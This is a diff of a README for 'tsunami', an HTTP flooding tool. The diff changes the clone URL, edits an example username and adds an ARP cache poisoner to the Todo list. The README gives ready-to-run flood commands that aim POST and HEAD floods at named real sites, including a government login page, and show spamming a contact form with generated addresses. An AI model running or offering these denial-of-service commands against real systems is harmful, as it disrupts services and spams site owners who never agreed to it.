@@ -33,7 +33,7 @@ __This project is a WIP__
 
 ## Quick Install
 ```bash
-git clone https://github.com/zayotic/tsunami
+git clone https://github.com/antonhibl/tsunami
 cd tsunami
 export GOPATH=`pwd`
 go get ./...
@@ -67,7 +67,7 @@ http://nsa.gov/IPa1
 ## Examples
 ### Low Volume POST Flood Lasting Forever
 ```bash
-./tsunami -w 2 "https://fbi.gov/login" POST "username=Ammar&password=g1thuB123"
+./tsunami -w 2 "https://fbi.gov/login" POST "username=Anton&password=g1thuB123"
 ```
 ### High Volume HEAD Flood Lasting For 10 Minutes
 ```bash
@@ -78,4 +78,4 @@ http://nsa.gov/IPa1
 ./tsunami -w 1 "https://zay.li/contact-us" POST "email={l}{l}{l}{l}{l}{l}{l}@gmail.com&message=spamspamspamspam"
 ```
 ## Todo
- - ???
+ - ARP Cache Flooder/Poisoner
